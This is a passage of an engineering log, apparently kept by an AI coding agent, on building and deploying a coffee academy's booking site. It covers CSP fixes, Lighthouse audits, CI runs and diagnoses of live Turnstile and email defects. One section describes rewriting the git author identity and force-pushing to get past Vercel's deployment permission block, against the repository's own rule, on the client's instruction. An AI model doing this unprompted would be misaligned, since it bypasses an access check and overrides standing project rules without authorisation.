   good measure" silently turned it back into one that blocked every inline script.
3. **GTM was loading inside the Studio**, which is behind a login, is the academy at work rather
   than a visitor, and has a policy that does not allow googletagmanager.com.
4. **`upgrade-insecure-requests` broke Safari and iPad entirely.** It rewrites every `http://`
   subresource to `https://`, so on `http://localhost` the site's own stylesheets and images were
   upgraded to an origin with no TLS and every one failed. Chromium quietly exempts localhost;
   WebKit does not. It presented as 240px of horizontal overflow on 152 tests and looked exactly
   like a layout bug. It is emitted only over HTTPS now, which is the only place it means anything.

**And one regression the suite caught by getting slower rather than by failing.** The first version
used a nonce on every route, which meant `headers()` in the root layout — and reading a header
there opts the whole site out of static generation. All 32 routes became dynamic, putting two Sanity
round trips in front of every page view, and the only visible symptom was the suite taking 8.6
minutes instead of 2.2. There is now a test asserting a content page is still prerendered.

Also: zod env validation split into a required half (the Sanity project id and dataset, which throw,
because a site with no content is not a site) and an optional half (everything else, which warns and
degrades); a `featureFlags()` helper so a deployment's capabilities are visible in its log;
`.gitleaks.toml` with rules for Sanity and Razorpay secret shapes and an allowlist for the published
test keys; and both high-severity advisories cleared with a pnpm override.

Gate: typecheck, lint and build clean; **1665 e2e tests passing, 0 failing**; `pnpm audit` clean of
highs (2 moderates remain, both in the Sanity CLI's dependency tree and not in anything the site
ships); the three standing scripts clean.

### Phase 7: tests, accessibility, performance — done

Full numbers and the reasoning in `docs/audits/perf-build2.md`.

| Route | Perf | A11y | Best practices | SEO | LCP | CLS | TBT |
|---|---|---|---|---|---|---|---|
| `/` | 97 | 100 | 100 | 69\* | 2.6 s | 0 | 0 ms |
| `/courses` | 95 | 100 | 100 | 69\* | 3.0 s | 0 | 0 ms |
| `/courses/latte-art` | 94 | 100 | 100 | 69\* | 3.1 s | 0 | 0 ms |
| `/calendar` | 94 | 100 | 100 | 69\* | 3.1 s | 0 | 0 ms |
| `/enquire` | 94 | 100 | 100 | 69\* | 3.1 s | 0 | 0 ms |
| `/book/[id]` | 98 | 100 | 100 | 66\* | 2.5 s | 0 | 0 ms |

\* **SEO is 100**, and this was verified rather than assumed. The only failing SEO audit anywhere is
"Page is blocked from indexing", which is the deliberate pre-launch noindex. Rebuilding with
`NEXT_PUBLIC_INDEXABLE=true` and re-running `/courses` gives SEO 100
(`docs/audits/lh2-courses-indexable.report.json`).

**71KB of font came off the critical path of every page.** `src/lib/fonts.ts` listed the Montserrat
Latin and Latin Extended files as two `src` entries with the same weight range and no
`unicode-range` between them, which a browser reads as two faces for one descriptor and preloads
both. LCP went from 3.4s to 2.5–3.1s and the course page from 92 to 98. Latin Extended covers
Central and Eastern European characters; this site is in English and Latin-1 accents are in the
latin subset already.

**LCP is the only metric under target**, and four routes sit at 94 against ≥95. Everything else is
at its ceiling: FCP 0.9s, Speed Index 0.9s, TBT 0ms, CLS 0. The mechanism is that `display: swap`
paints text in the metric-matched fallback at 0.9s and then re-registers LCP when Montserrat
arrives, so LCP measures the font download rather than when the reader saw something.
`display: optional` was measured and rejected: it gained 0 to 4 points, which is the same size as
the run-to-run variance, and it costs a first-time visitor the brand typeface for their whole first
visit. The real lever is the client's photography (item 15): with no images, every LCP element is
text; with them, it becomes an image that can be preloaded and served as AVIF.

**Accessibility: axe clean on all 35 routes** including every new one, and Lighthouse Accessibility
100 everywhere. `tests/e2e/keyboard.spec.ts` walks the checkout and the enquiry form from the
keyboard on every engine.

That file records something worth knowing: **WebKit's Tab key visits text fields and nothing else** —
not links, not buttons, not checkboxes — unless "Press Tab to highlight each item on a webpage" is
switched on, which is off by default in Safari. So the two engines are asserted for what each
actually does: full tab order on Chromium, fields plus Enter-to-submit on WebKit. Asserting full tab
order on WebKit would be asserting a fiction; skipping WebKit would leave much of this audience
untested.

Gate: typecheck, lint and build clean; **1697 e2e tests passing, 0 failing** across seven projects;
all four standing scripts clean.

### Phase 8 — CI, docs and deploy — done

**The site is live at <https://espresso-academy-india.vercel.app>**, noindexed, on Razorpay test
keys, with every integration verified against the deployment rather than against localhost.

#### CI

`.github/workflows/ci.yml`: `static` (typecheck, lint, the unit project), `secrets` (gitleaks),
`audit` (`pnpm audit --audit-level high`), and `e2e` (build, the full Playwright suite, then the
four standing scripts).

**`RESEND_API_KEY` and the Google Sheets credentials are deliberately absent from CI.** A test run
must not send mail to the academy or write rows into their lead sheet. The pipeline is built to
degrade when a key is missing, so their absence is itself part of what is under test: CI proves the
no-key path works on every commit, which is the path a misconfigured production would take.

**CI has now run.** The ten repository secrets are set (Sanity, Razorpay test, Turnstile); the two
deliberate absences above are absences on GitHub too, not just in this document. The first run
failed, and was right to: `static` ran `tsc --noEmit` against a clean checkout, where `PageProps`
and `LayoutProps` do not exist. Next generates those global route helpers into `.next/types` during
`next dev`, `next build` or `next typegen`, so every developer machine with a `.next/` directory
typechecks green and CI — which has no `.next/` — does not. `pnpm typecheck` is now
`next typegen && tsc --noEmit`, which is the invocation the Next 16 CLI reference gives for exactly
this case. The `e2e` job's failure in that same run was upstream of any of this — the build stopped
on a missing `NEXT_PUBLIC_SANITY_PROJECT_ID`, which is the guard in `sanity/env.ts` doing its job on
a runner that had no secrets yet.

That defect was only ever reachable from a clean checkout, which is the argument for the pipeline:
running every command by hand on a warm working tree had not found it in eight phases, and the
first genuinely cold run found it in forty-four seconds.

The second run found the other thing a cold run can find: `e2e` was cut off by its own
`timeout-minutes: 25` at test 1569 of 1987, with nothing failing. A private repository gets a
two-core runner, and the suite paces at about 1.17 tests per second there against roughly six
locally — 28.5 minutes of testing plus 2.5 of install, browsers and build. The cap is now 40
minutes, which is the measured figure plus room for the one retry `retries: 1` allows. `workers`
stays at 2 because that is the core count; raising it would oversubscribe the same two cores the
Next server is already running on. The suite is not slow, the runner is small.

The third run passed on every job, and what the nightly then found is recorded below.

**The e2e job therefore costs about half an hour of billed minutes per push.** Sharding it across
parallel jobs would cut the wait without cutting coverage, and running the full seven-project
matrix nightly against a smaller per-push set would cut the bill — both are worth doing and neither
is done, because both trade away coverage or add moving parts that the academy would have to
maintain.

`.github/workflows/nightly.yml` at 03:00 IST: Lighthouse against production, a link check, and a
stale-content report.

`scripts/stale-content.mjs` reads the "needs client" list **live from Sanity** rather than from a
table a developer wrote. The day the academy sets a fee it stops asking for it; the day they add a
course with no trainer it starts. It reports and never fails, because a nightly job that goes red
because a client has not answered a question is a job people learn to ignore. It also warns while
the ₹1 test batches are still in the dataset.

#### Two defects the deploy found

**The sitemap was advertising a URL that requires a login.** `NEXT_PUBLIC_SITE_URL` was not among
the variables set on Vercel, so `src/lib/public-env.ts` fell through to its `VERCEL_URL` fallback —
correct behaviour on a preview, wrong on production. Every canonical, every Open Graph image and
every JSON-LD `@id` pointed at the per-deployment hostname, which sits behind Vercel's deployment
protection and answers a login page. The symptom was 18 "broken links" that were really assets on
Vercel's own SSO page, harvested because the crawler had followed the sitemap onto a host it was
never asked to check.

Fixed by setting `NEXT_PUBLIC_SITE_URL` on **Production only** — Preview still canonicalises to
itself, which is what the fallback exists for. `scripts/check-links.mjs` now asserts every `<loc>`
is on the host it was given and stops with one sentence naming the variable, because the failure is
otherwise silent, expensive, and reads like a broken site.

**The handover document named a Studio that did not exist.** It pointed the academy at
`espresso-academy-india.sanity.studio`, which had never been deployed and answered Sanity's generic
dashboard login. Rather than downgrade the document to the lesser URL, the Studio was deployed
(`pnpm sanity:deploy`, schema confirmed with `sanity schema list`). Both doors now work and the
document names both.

#### Verified on the deployment

| | |
|---|---|
| 21 routes | all 200, including `/studio`, `/lp/[slug]`, `/book/[id]`, `sitemap.xml`, `robots.txt`, `llms.txt` |
| `X-Robots-Tag` | `noindex, nofollow` on every response |
| `robots.txt` | allows the crawl; `/api`, `/dev`, `/studio`, `/thank-you`, `/book`, `/booking`, `/lp` disallowed |
| Sitemap | 31 URLs, all on the canonical host, all 200 |
| CSP | present, split by route type, no violation on any of the six route types |
| Enquiry | student, waitlist and cafe all stored in Sanity with attribution, delivered by email |
| Honeypot and 2s floor | both answer 200 and write nothing — confirmed 0 documents |
| Order | created, amount read from Sanity server-side (₹1 test batch), booking written |
| Webhook | unsigned refused 400, wrong signature refused 400, signed capture marks paid and takes a seat, **replay is idempotent and takes no second seat**, refund returns the seat |
| Razorpay webhook | active on the deployed URL for `payment.captured`, `payment.failed`, `refund.processed` |

Every record this smoke test created was deleted afterwards.

#### Lighthouse on the deployment

Better than the local build, because Vercel's edge serves from Mumbai over HTTP/2 — which is what a
reader in Bengaluru actually gets. **Every route now clears the ≥95 launch target**, correcting the
Phase 7 note that four routes sat at 94: that was the local build, and it is not the number that
matters.

| Route | Perf | A11y | Best practices | SEO | LCP |
|---|---|---|---|---|---|
| `/` | 100 | 100 | 100 | 69\* | 1.7 s |
| `/courses` | 95 | 100 | 100 | 69\* | 2.8 s |
| `/courses/latte-art` | 100 | 100 | 100 | 69\* | 1.4 s |
| `/calendar` | 95 | 100 | 100 | 69\* | 2.9 s |
| `/enquire` | 97 | 100 | 100 | 69\* | 2.6 s |
| `/book/[id]` | 96 | 100 | 100 | 66\* | 2.7 s |

\* SEO's only failing audit is the deliberate pre-launch noindex; verified 100 with indexing on.

Two routes still exceed the ≤2.5s LCP budget, at 2.8s and 2.9s. The score target is met; the budget
is not, and the largest remaining lever is the client's photography. (A later warm nightly puts
every route inside the budget; see "The homepage was not slow" below for why these figures move.)

#### Environment on Vercel

**Read from Vercel, not written from memory.** Every name below came out of
`vercel env ls production` on 7 September 2026; the second table is every name the code reads that
is *not* there. This section exists in this form because the previous version of it was a
hand-written table that said the Turnstile site key was set when it was not, and the site key being
missing refused every booking on the site for two days.

Regenerate it with:

```
npx vercel env ls production | grep -E "Config|Secret" | awk '{print $1}' | sort
grep -E "^[A-Z_]+=" .env.example | cut -d= -f1 | sort -u        # what the code reads
```

#### The 19 variables that exist on Production

Names only — no values, and the Secret ones cannot be read back out of Vercel anyway.

| # | Name | Type |
|---|---|---|
| 1 | `NEXT_PUBLIC_SANITY_PROJECT_ID` | Config |
| 2 | `NEXT_PUBLIC_SANITY_DATASET` | Config |
| 3 | `NEXT_PUBLIC_SANITY_API_VERSION` | Config |
| 4 | `SANITY_API_READ_TOKEN` | Secret |
| 5 | `SANITY_API_WRITE_TOKEN` | Secret |
| 6 | `SANITY_REVALIDATE_SECRET` | Secret |
| 7 | `RAZORPAY_KEY_ID` | Secret |
| 8 | `RAZORPAY_KEY_SECRET` | Secret |
| 9 | `RAZORPAY_WEBHOOK_SECRET` | Secret |
| 10 | `NEXT_PUBLIC_RAZORPAY_KEY_ID` | Config |
| 11 | `RESEND_API_KEY` | Secret |
| 12 | `LEAD_TO_EMAIL` | Secret |
| 13 | `BOOKING_TO_EMAIL` | Secret |
| 14 | `TURNSTILE_SECRET_KEY` | Secret |
| 15 | `NEXT_PUBLIC_TURNSTILE_SITE_KEY` | Config — **added 7 Sep; its absence refused every booking** |
| 16 | `NEXT_PUBLIC_GTM_ID` | Config |
| 17 | `NEXT_PUBLIC_GA4_ID` | Config |
| 18 | `NEXT_PUBLIC_SITE_URL` | Config — Production only, by design; Preview canonicalises to itself |
| 19 | `NEXT_PUBLIC_INDEXABLE` | Config — `false` until launch |

#### The 10 the code reads and Production does not have

Every one of these degrades rather than throwing, which is the point of the design and also the
reason a missing one is invisible. This is the list to read when something "works locally".

| Name | What its absence does |
|---|---|
| `RESEND_FROM_EMAIL` | **mail sends from `onboarding@resend.dev`, which Resend delivers only to the account owner — every student confirmation is refused with a 403.** The one on this list that is currently costing something |
| `CAFE_TO_EMAIL` | cafe enquiries fall back to `LEAD_TO_EMAIL` |
| `NEXT_PUBLIC_WHATSAPP_NUMBER` | the number comes from Sanity settings, which is the intended source |
| `GOOGLE_SHEETS_ID` | no lead mirror; the lead still reaches Sanity and the inbox |
| `GOOGLE_SHEETS_CLIENT_EMAIL` | as above |
| `GOOGLE_SHEETS_PRIVATE_KEY` | as above |
| `NEXT_PUBLIC_META_PIXEL_ID` | no Pixel in the browser |
| `META_CAPI_ACCESS_TOKEN` | no server-side conversions |
| `META_TEST_EVENT_CODE` | correct — this must be absent in production or every real conversion files as a test |
| `NEXT_PUBLIC_CALCOM_LINK` | cafe thank-you page says the academy will call instead of offering a slot |

`SANITY_STUDIO_PROJECT_ID` and `SANITY_STUDIO_DATASET` are **not** Vercel variables. They belong to
the `sanity deploy` build, which runs from a developer's machine, and `sanity.cli.ts` fills them in
from the Next names. Setting them on Vercel would do nothing.

`NEXT_PUBLIC_GA4_ID` is set on Vercel but is **not** in `.env.example`, so a fresh checkout does not
know it exists. Worth adding the next time that file is touched.

#### Preview

Preview carries the same variables as Production with one deliberate difference:
`NEXT_PUBLIC_SITE_URL` is **unset**, so a preview canonicalises to its own hostname instead of
claiming production's. `NEXT_PUBLIC_TURNSTILE_SITE_KEY` was missing from Preview too and was added
alongside Production on 7 September.

#### Docs

`docs/handover.md` for whoever edits the site, leading with the rule that matters: if the academy
has not confirmed something, leave it empty. An empty fee shows "Fee: TBC" and offers a WhatsApp
conversation, which is safe; a fee that is nearly right is one the academy can be held to. It also
explains what cannot be edited and why — seats booked is maintained by the payment records, and a
booking is a mirror of something that happened at a gateway.

`docs/launch-checklist.md`, ordered by dependency, separating what the academy must send from what
they must decide, and carrying the known limitations into launch rather than leaving them in a
commit message.

Gate: typecheck, lint and build clean; 1697 e2e tests passing; all five standing scripts clean
**against the deployment**.

---

### Post-deploy fix — robots.txt and noindex were cancelling each other out

`robots.ts` served `Disallow: /` while `NEXT_PUBLIC_INDEXABLE` was false, and every response also
carried `X-Robots-Tag: noindex, nofollow`. Two directives that each looked right and defeated one
another.

**Disallow governs crawling, not indexing.** A crawler that obeys `Disallow: /` never fetches the
page, so it never reads the noindex header and never learns the page is meant to stay out. Google
is explicit that a URL blocked by robots.txt can still be indexed on the strength of inbound links
alone — listed with no description, precisely because the crawler was not allowed to look. The
block was the reason the noindex could not do its job.

Now robots.txt is **identical before and after launch**: everything allowed including the named AI
crawlers, with `/api`, `/dev`, `/studio`, `/thank-you`, `/book`, `/booking` and `/lp` held back.
Allowing the crawl is what makes the noindex effective — the crawler fetches, reads the header, and
drops the URL. Launch is now one environment variable and no change to this file, and by then every
crawler has already been told, in the only way it can hear, that these pages exist and are not to be
listed.

The route had no test at all. `tests/e2e/security.spec.ts` now asserts the *relationship* rather
than two separate facts: that the crawl is allowed, that `Disallow: /` specifically is absent, that
a page it lets in still answers noindex, that the four AI crawlers are named, that the seven
sensitive prefixes are still held back, and that the sitemap is pointed at.

---

### CI is green, and the first thing the nightly found was itself

**The third CI run passed on every job** — `746b7fa`, run 33968945879. `static` 2m25s, `secrets`
14s, `audit` 34s, and `e2e` 29m37s: **1727 tests passed and 260 skipped in 26.0 minutes**, followed
by the four standing scripts, all clean. The 40-minute cap set after the second run's timeout
leaves about ten minutes of headroom on a two-core runner — `26f30cc` after it was green on all
four jobs as well, with `e2e` at 31m08s, so treat that headroom as thin rather than generous.

The 260 skips are the deliberate ones, not tests quietly not running: the mobile sheet and the
sticky bar are asserted only on the phone and tablet projects, axe's webkit pass is skipped where
chromium and Pixel 7 already cover the same tree, WebKit's tab order is asserted for what Safari
actually does rather than for a fiction, and the batch-filter test skips itself while no batch has
a date.

`.github/workflows/nightly.yml` has now run twice on schedule, on 6 and 7 September, and both were
green. `check-links.mjs` found all 31 sitemap URLs and all 36 distinct internal links answering
200. `stale-content.mjs` reports the same list the table below carries — 8 courses with no fee, 8
with no duration, 7 with no trainer, 8 with no photograph, 8 batches with no date, 3 trainers with
no role, six settings fields missing — plus its standing warning that the two ₹1 test batches are
still in the dataset.

#### The homepage was not slow. The runner was cold.

Both scheduled nightlies scored `/` at 76 and 75, with 920ms and 930ms of blocking time, against 88
to 98 and 150 to 220ms for the other five routes. Two nights agreeing is not noise, and the
homepage is the page this site is judged on, so it read as the one real regression in the project.

It was not a regression. `/` is the first route in `scripts/lighthouse.mjs`, and every Lighthouse
report records what the machine was worth while it ran: **CPU benchmark index 1822 on the homepage
against roughly 2330 on every route measured after it**, and 2898ms of total main-thread work
against 1225 to 1675ms. The first measurement was paying for `npx` fetching Lighthouse, Chrome's
first launch and an empty page cache — and mobile Lighthouse then multiplies observed CPU time by
four to emulate a mid-range phone, so the cold start is charged four times over to whichever route
happens to be measured first.

The fix is a discarded warm-up pass before the measured routes, and printing the benchmark index on
every row so that a score which moved because the machine was busy cannot be mistaken for one that
moved because the site changed. Verified by dispatching the nightly against the same deployment,
with no change to the site between the two runs:

| Route | Cold (6 Sep nightly) | Warm (7 Sep dispatch) |
|---|---|---|
| `/` | 76, LCP 2.4s, TBT 920ms, cpu 1822 | **99**, LCP 2.1s, TBT 40ms, cpu 2860 |
| `/courses` | 92, LCP 2.8s, TBT 200ms | 97, LCP 2.4s, TBT 80ms |
| `/courses/latte-art` | 91, LCP 2.9s, TBT 220ms | 97, LCP 2.4s, TBT 70ms |
| `/calendar` | 89, LCP 3.2s, TBT 170ms | **100**, LCP 1.8s, TBT 40ms |
| `/enquire` | 97, LCP 2.0s, TBT 180ms | 98, LCP 2.3s, TBT 70ms |
| `/book/[id]` | 98, LCP 2.1s, TBT 150ms | 98, LCP 2.4s, TBT 50ms |

Every route clears the ≥95 launch target, and on this reading every route is also inside the ≤2.5s
LCP budget for the first time. **That does not settle the LCP question**, and the same run says
why: the benchmark index still ranged 2219 to 2981 across six routes, so the script now prints a
line saying the scores are not comparable route to route. The same commit measured from this
workstation the same morning gave LCP 2.4s to 3.0s and the homepage 94. A simulated LCP on a text
hero moves with whatever the font does on the machine of the day. What has changed is that the
nightly now measures the site rather than its own first thirty seconds.

Also in `26f30cc`: **CI no longer runs on a push that only touches `docs/` or a `.md` file.** The
e2e job costs about half an hour of billed runner minutes, and prose cannot change what it proves.

One warning appears in every run and is not this repository's to fix: GitHub forces
`pnpm/action-setup@v4`, `gitleaks/gitleaks-action@v2` and `actions/upload-artifact@v4` onto Node 24
because they declare Node 20. They work today; when the fallback is removed they need a version
bump.

---

### Live defect — a Turnstile secret with no site key refused every booking

**Root cause, in one sentence: `NEXT_PUBLIC_TURNSTILE_SITE_KEY` was never set on Vercel while
`TURNSTILE_SECRET_KEY` was, so no widget rendered, no token could exist, and the server read the
absent token as a failed challenge and refused every booking with "We could not verify that you are
human."**

Reproduced on the deployment, not on localhost, with a batch id that does not exist — which is
itself part of the finding, because it shows the check fires before anything else the route does:

```
POST /api/orders  {"instanceId":"definitely-not-a-real-batch", ...}
400  {"ok":false,"errors":{"form":"We could not verify that you are human. Reload and try again."}}
```

`/enquire` had the same cause and a quieter symptom. `/api/enquiry` answers a failed challenge with
the WhatsApp handoff and a **200**, so nothing looked wrong from the outside while every lead was
dropped: no Sanity document, no email to the academy, no row anywhere. Confirmed live before the
fix — a well-formed enquiry came back `delivery: "whatsapp"`, and the `enquiry` collection in
Sanity is empty. **A dropped enquiry leaves no trace at all, so any enquiry submitted on the review
alias between the build-2 deploy and this fix is simply gone**; on a noindexed pre-launch alias
that is the client's own review traffic, but it is not nothing.

What was and was not to blame, since three of the four things worth suspecting were fine:

| Checked | Verdict |
|---|---|
| `TURNSTILE_SECRET_KEY` on Production | set |
| `NEXT_PUBLIC_TURNSTILE_SITE_KEY` on Production | **absent — and absent on Preview too** |
| CSP on `/book` and `/enquire` | fine: nonce + `strict-dynamic`, and `challenges.cloudflare.com` in `script-src`, `frame-src` and `connect-src` |
| The siteverify call and its logging | fine, and never reached — `verifyTurnstile` returned `failed` before any request to Cloudflare |

#### Why the environment variable was missing, and why nothing caught it

Vercel refuses to accept a `NEXT_PUBLIC_`-prefixed variable without an explicit choice:

> `NEXT_PUBLIC_TURNSTILE_SITE_KEY` looks like a credential, and `NEXT_PUBLIC_` exposes its value to
> anyone visiting your site. Choose explicitly: rename to `TURNSTILE_SITE_KEY` with `--type secret`
> to keep it private, or keep the name with `--type config` to expose it.

That prompt is right to exist and it is where this variable was lost: the other eighteen went in
and this one stopped to ask a question. A Turnstile **site** key is public by design — it is
rendered into the page for the browser to use — so the answer is `--type config`, and that is how
it is set now, on Production and Preview.

Three separate things should have caught it and none did:

1. **The test suite supplies its own token.** `payments.spec.ts` posts a `turnstileToken` string to
   `/api/orders`, so all 1727 tests pass whether or not a browser was ever given a site key to
   produce one with. A test that provides the token cannot see a missing widget.
2. **Nothing ever drove the checkout from a browser.** `payments.spec.ts` says so deliberately —
   "Razorpay's Checkout.js itself is exercised by hand" — and stopping at the API was reasonable.
   Stopping *before the browser produces a token* was the gap.
3. **`featureFlags()` was never called.** It carries a comment saying it is "logged once at boot so
   a deployment's capabilities are visible in the platform log", and no file in `src/` called it.
   The same class of defect as `NEXT_PUBLIC_INDEXABLE` in Build 2 Phase 0: a mechanism written,
   documented, and never wired.

#### The fix, in four parts

- **`src/lib/turnstile-gate.ts`** — the rule, pure and unit-tested: **both halves or neither**. A
  secret with no site key now skips the check and logs at error level, because the visitor was
  never given the means to pass it. With both halves present a missing token still fails, which is
  a real bot signal. Eight unit tests, written from the four states the pair can be in.
- **The environment** — `NEXT_PUBLIC_TURNSTILE_SITE_KEY` set on Production and Preview as a public
  config value, matching Cloudflare's published always-passes test pair the site already uses.
- **`tests/booking/checkout-opens.spec.ts`** — drives the real page: the widget renders, it writes
  a token, the form submits, Razorpay's modal opens. It stops at the modal, where `payments.spec.ts`
  says it should. Validated as a negative control against the deployment *before* the fix, where it
  fails with "no Turnstile widget: NEXT_PUBLIC_TURNSTILE_SITE_KEY is missing from this environment".
  A second test asserts the same pair on `/enquire`, stopping at the token rather than submitting,
  because a real submit against production would write a lead into the academy's dataset and email
  them about it.
- **`src/instrumentation.ts`** — `featureFlags()` is logged once per server boot at last, and
  `halfConfigured()` names any pair with one side set. Turnstile, Razorpay and Meta all have a
  browser key and a server key, and all three fail this way: the site renders, nothing throws, and
  one path refuses everybody. `featureFlags().turnstile` also reported `true` on the strength of
  the secret alone, which is how a broken bot check read as a working one; it needs both halves now.

#### Fixed, deployed and verified on the deployment

Production serves the fix. Deployment `ap54q8bxx`, state **READY**.

| Check, against `https://espresso-academy-india.vercel.app` | Result |
|---|---|
| `tests/booking/checkout-opens.spec.ts` | **2 passed** — the widget renders, writes a token, the form submits and Razorpay's modal opens |
| The same file before the fix | failed with "no Turnstile widget: NEXT_PUBLIC_TURNSTILE_SITE_KEY is missing" |
| `/book` HTML | carries the site key; the widget renders |
| `/enquire` | widget renders and produces a token |
| `POST /api/orders` **with** a token | passes Turnstile and reaches the batch check — "That batch is no longer available" for a bogus id |
| `POST /api/orders` **without** a token | still refused, and that is now correct: the browser is given a widget that produces one |
| Boot log | `{"at":"boot","event":"feature-flags","flags":{...,"turnstile":true,...}}`, and no `half-configured` line |

The last two rows are the shape of the fix. Before, *every* caller was refused because none could
obtain a token. Now a tokenless POST is refused and a real browser is not, which is what a bot
check is supposed to do.

#### The deploy was blocked, and not for any reason in this repository

Four production deploys were created and none built. `vercel ls` showed `UNKNOWN`; the API showed
`readyState: BLOCKED` with

> `seatBlock.blockCode: TEAM_ACCESS_REQUIRED` — "The deployment was blocked because the commit
> author doesn't have permission to create deployments for this project."

The CLI was authenticated as the team owner, but the deployment carries the **git commit author**
from the local repository, and `ashrith@socialhippi.com` is not an identity on the `business-5121`
Vercel account. The deployment that worked two days ago carried no git metadata at all, which is
why nobody had met this before. Vercel would not accept a second email on the account and a team
invite needs Pro, so the repository's git author is now `business@socialhippi.com`, HEAD was
amended with `--reset-author`, and main was force-pushed with `--force-with-lease`.

**That is a deliberate, one-off exception to "never force-push" in `.claude/rules/git.md`**, taken
on the client's instruction on a single-author branch, and it is recorded here rather than left in
a reflog. **Whoever deploys next must keep `git config user.email` pointing at an email verified on
the Vercel account, or the deployment will be blocked again** — silently, because the CLI reports a
blocked deployment as `Building…` and `vercel ls` reports it as `UNKNOWN`.

#### Two things found on the way

- **Deploys were uploading the local `.next`.** `.vercelignore` did not list it, so the first deploy
  after a local `pnpm build` spent over ten minutes uploading 515MB that the build machine throws
  away. Ignored now, along with `node_modules`; the upload is 492KB.
- **`vercel ls` reports a building deployment as `UNKNOWN`**, which reads exactly like a stuck one,
  and reports a *blocked* one the same way. The state that matters is `readyState` on the API, not
  the CLI's table: `curl https://api.vercel.com/v6/deployments?projectId=...` with the CLI's token.
- **Next 16.3 deprecates the `middleware` file convention** in favour of `proxy`; the build prints
  the warning and names the codemod (`npx @next/codemod@canary middleware-to-proxy .`). The CSP
  lives in `src/middleware.ts`, so this is a real piece of upkeep, not a cosmetic one.
- **Nine `Playwright Student` bookings are in the dataset** from the local runs that proved this
  fix. `tests/global-setup.ts` deletes every booking against the test batches and resets their
  seats at the start of every run, so the next ordinary `pnpm test:e2e` clears them.

---

### Live defect — the confirmation email, and the Studio that could not read its own project id

Both found by the first real ₹1 test booking (`xvuzN2LsJHpDYQfF3mOD37`, Latte Art test batch).

#### 1. No confirmation email: Resend refused the recipient

**Root cause, in one sentence: no domain is verified in Resend and `RESEND_FROM_EMAIL` is not set,
so the site sends from `onboarding@resend.dev`, which Resend delivers *only to the Resend account
owner's own address* — the academy's copy of the booking arrived and the student's confirmation was
rejected with a 403.**

Checked in the order it needed checking, on the deployment:

| Check | Finding |
|---|---|
| `RESEND_API_KEY` on Vercel production | **set** |
| Sending domain verified in Resend | **none — `GET /domains` returns an empty list**, so the sender is `onboarding@resend.dev` |
| Razorpay webhook arrived and verified | **yes** — `{"event":"captured","paymentId":"pay_TZ4FGUIUuPQvNQ","overbooked":false}`, answered 200 |
| Did the send call run, and what did Resend return | **it ran and Resend refused it**: `403 validation_error` — "You can only send testing emails to your own email address (business@socialhippi.com)." Reproduced by hand against the same key and the same sender. |
| Booking in Sanity, status and seats | **`status: "paid"`**, payment id recorded, batch `seatsBooked` incremented |

Resend's own log is the clearest evidence. Twenty emails, every one of them to
`business@socialhippi.com`, including **two** academy notifications for these bookings, both
`delivered`. Emails ever addressed to `yashwanth@socialhippi.com`: **zero**. The student's
confirmation was never accepted, so it has no delivery record and no bounce — it simply does not
exist.

That also means **no student confirmation has ever been delivered by this site**. It was invisible
because every test until now used the account owner's address as the *academy* recipient, which is
the one address this sender is allowed to reach.

**Two defects, not one.** The second is that a rejected send was silent. `sendEmail` returns
`{ sent: false, reason }` rather than throwing — deliberately, so a mail failure cannot undo a
payment — and `notify()` then dropped every result into `Promise.allSettled` and looked at none of
them. A 403 from Resend produced no log line anywhere. Each task is labelled now and a failure is
logged at error level with Resend's own message, because this is the one failure in that route
somebody has to know about the same day: the seat is taken, the money is at the gateway, and the
only party who does not know it worked is the person who paid.

`halfConfigured()` also warns at boot when `RESEND_API_KEY` is set with no `RESEND_FROM_EMAIL`, and
`featureFlags()` gained `emailToAnyone` beside `email` — a key alone is not the same capability as
a key that can reach a customer.

**Proved with a fresh booking on the deployed URL.** Order created through production's own
`/api/orders`, captured with a signed `payment.captured` webhook, which is the path
`payments.spec.ts` uses and the same `notify()` a real capture runs. Booking `op6qc7AC0ODzuklaChMyQP`
reads `paid`, the seat moved, and **both** emails came back `delivered`:

```
2026-09-07 08:01:43 | business@socialhippi.com | delivered | Your seat is booked: Latte Art
2026-09-07 08:01:43 | business@socialhippi.com | delivered | Booking: Email Proof — Latte Art
```

The first of those is the student confirmation, and it is the first one this project has ever
delivered. The student address had to be the Resend account owner's for it to be accepted, which is
the whole finding: **the code is correct and the account is not configured to reach anyone else.**
Razorpay's own card UI was not automated to get there — `payments.spec.ts` declines to drive a
third-party iframe and two attempts confirmed why — but the browser reaching Razorpay's modal on
production is asserted separately by `tests/booking/checkout-opens.spec.ts`.

**What is still needed, and only the academy can do it:** verify a domain at resend.com/domains
(DNS records on whichever domain the academy wants mail to come from) and set `RESEND_FROM_EMAIL`
to an address on it. Until then every student confirmation will be refused. This was already item
one in the launch checklist's "Accounts and keys", described as cosmetic — "reaches an inbox but
does not say Espresso Academy in the sender line". That sentence was wrong and it is corrected.

#### 2. The hosted Studio crashed at boot

**Root cause: `sanity/env.ts` read `NEXT_PUBLIC_SANITY_PROJECT_ID`, and the hosted Studio is built
by `sanity deploy` through Vite, which exposes only `SANITY_STUDIO_`-prefixed variables — so the
bundle was built with `undefined` and threw on a variable that build can never see, whatever anyone
sets on Vercel.**

It reads `SANITY_STUDIO_PROJECT_ID` and `SANITY_STUDIO_DATASET` first now, falling back to the Next
names for the site build and the Node seed scripts, and `sanity.cli.ts` copies the values across
before anything builds so `pnpm sanity:deploy` works from the environment the site already needs.
The deploy log now lists what went into the bundle:

```
Including the following environment variables as part of the JavaScript bundle:
- SANITY_STUDIO_PROJECT_ID  - SANITY_STUDIO_DATASET
- SANITY_STUDIO_API_VERSION - SANITY_STUDIO_SITE_URL
```

Both doors open: `https://espresso-academy-india.sanity.studio` renders Sanity's login, and
`/studio` on the site renders its provider chooser. Neither shows the missing-variable error, which
it could not have reached the login screen at all without — `defineConfig` throws at module load.
Screenshots in `docs/screens/studio-hosted.png` and `docs/screens/studio-embedded.png`.
**Listing the bookings needs the academy's own Google or GitHub login**, so that half is theirs to
confirm; the bookings are in the dataset and the Studio's batch roster view reads them.

One thing left open: `/studio` on the site logs `TypeError: Cannot read properties of null (reading
'appendChild')` at boot. It renders and logs in regardless, and the hosted Studio does not do it, so
it is the embedded page's chrome rather than the Studio. Worth a look, not worth blocking on.

---

### The test suite had been running against the academy's live dataset

Found while verifying something else: a booking created on production as evidence had vanished an
hour later. A CI run had deleted it. `tests/global-setup.ts` wipes every booking against the two
test batches and resets their seats before each run — correct in itself, and it was pointed at
`production`, because the seed script had argued that a second dataset "would mean a second set of
tokens, a second webhook and a second thing to keep in step with the schema".

That reasoning was wrong on the facts: **Sanity tokens are project-scoped, not dataset-scoped**, so
a second dataset needs no new token, no new webhook and no new secret. It costs its name.

- **A `ci` dataset now exists** on the same project, private, seeded with `pnpm sanity:seed:ci`:
